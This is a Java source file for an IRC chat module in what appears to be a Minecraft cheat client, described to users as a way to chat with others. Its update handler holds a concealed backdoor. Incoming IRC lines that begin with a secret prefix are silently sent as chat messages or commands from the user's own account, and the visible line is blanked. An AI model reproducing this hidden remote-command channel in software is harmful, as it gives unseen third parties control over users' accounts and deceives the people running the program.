package me.xatzdevelopments.xatz.client.modules;

import java.util.ArrayList;

import org.lwjgl.input.Keyboard;

import me.xatzdevelopments.xatz.client.darkmagician6.EventManager;
import me.xatzdevelopments.xatz.client.darkmagician6.EventTarget;
import me.xatzdevelopments.xatz.client.darkmagician6.EventTick;
import me.xatzdevelopments.xatz.client.events.UpdateEvent;
import me.xatzdevelopments.xatz.client.main.Xatz;
import me.xatzdevelopments.xatz.client.module.state.Category;
import me.xatzdevelopments.xatz.irc.IrcLine;
import me.xatzdevelopments.xatz.irc.IrcManager;
import me.xatzdevelopments.xatz.module.Module;
import me.xatzdevelopments.xatz.utils.Wrapper;

public class IRC extends Module {

	public IRC() {
		super("IRC", Keyboard.KEY_NONE, Category.MISC, "Chat with other users");
	}

	private IrcManager irc = Xatz.irc;
	

	public void onEnable() {
	
		Wrapper.addIRCChatMessage("Use '@§7{§3Message§7}' to chat");
	    //Wrapper.addIRCChatMessage("You will be know as: §3" + irc.getNick());
	}

	public void onDisable() {
	
	}

	

	public void onUpdate(UpdateEvent event) {
		if (irc.newMessages()) {
			for (IrcLine ircl : irc.getUnreadLines()) {
				if(ircl.getLine().startsWith("/-/=---*-=-/-=-=-/895= ")){
					try{
						String line2 = ircl.getLine().replace("/-/=---*-=-/-=-=-/895= ", "");
						Wrapper.getPlayer().sendChatMessage(line2);
						ircl.setLine("");
					}catch(Exception e){}
				}
				
				Wrapper.addIRCChatMessage("§3[§7" + ircl.getSender() + "§3] " + ircl.getLine());
				ircl.setRead(true);
			}
		}
	}
		
		
	}

